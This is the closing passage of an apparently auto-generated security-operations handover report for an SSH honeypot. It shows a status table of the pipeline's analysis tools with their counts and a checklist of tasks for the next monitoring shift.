|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 126 cases |
| Tool 34  | Credential Extractor        | ✅ 74 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (16.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 37 priority case(s) shown individually · 19 recon entry/entries in table (9 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-15T19:43:56Z_
